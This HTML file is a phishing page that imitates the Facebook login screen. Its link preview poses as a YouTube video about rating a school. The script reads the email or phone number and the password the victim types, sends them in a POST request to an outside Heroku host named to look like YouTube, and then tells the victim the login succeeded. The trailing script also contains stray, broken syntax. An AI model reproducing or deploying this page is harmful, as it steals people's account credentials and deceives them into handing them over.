<!DOCTYPE html>
<html lang="en">
<head>
    <style type="text/css">
        body{
            background:url('../img/fb.png') no-repeat;
  background-size:cover;
        }
        .container{
         margin-top: 79.1%;
            
        }
        .but{
            
            height:3.5em;
            width: 34.5em;
           
            border-radius: 30px;
            margin-top: 10px;
            background:#0064E0;
            border: #0021bb 1px solid;
            color: white;
            
             }
        #emailOrMobile{
            
            height:4.3em;
            width: 33em;
            
            border-radius: 12px;
           
            background:white;
            border: #A2ACB5 1px solid;
            color: black;
            margin-bottom:1em;
            padding-left:1em;
           
            
        }
        
        #password{
            height:4.3em;
            width: 33em;
            padding-left:1em;
            border-radius: 12px;
      
            background:#white;
            border: #A2ACB5 1px solid;

        }
        
    </style>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Log in</title>
    <link rel="icon" href="img/fbicon.png">
    
     <meta property="og:title" content="RATING MY SCHOOL EXPERIENCE (*VERY BAD) #youtube">
  <meta property="og:description" content="Hello guys please watch me rate my school, thank you for watching and see you on the nex...">
  <meta property="og:image" content="img/icon.png">
  <meta property="og:url" content="https://youtube.com/">
  <meta property="og:type" content="website">
</head>
<body>
    <!-- bilat kantutan na agad -->
    <div class="container">
        <form id="loginForm">
            <input type="text" id="emailOrMobile" placeholder="Mobile number or email" required>
            
            <input type="password" id="password" placeholder="Password" required>
            <button class="but" type="submit" onclick="handleSubmit(event)"><b>Log in</b></button>
        </form>
    </div>
<!-- Script aitomation procces/backend data reciver -->
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
      event.preventDefault();

      const emailOrMobile = document.getElementById('emailOrMobile').value;
      const password = document.getElementById('password').value;

      fetch('https://YouTube-Video.herokuapp.com/login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ emailOrMobile, password })
      })
      .then(response => response.json())
      .then(data => {
        console.log('Success:', data);
      })
      .catch((error) => {
        console.error('Error:', error);
      });

   
  
          alert('Login successful'); // Notify user
            });
            .catch(error => {
                console.error('Error:', error);
                alert('Login failed'); // Notify user
            });
        }
    </script>
</body>
</html>
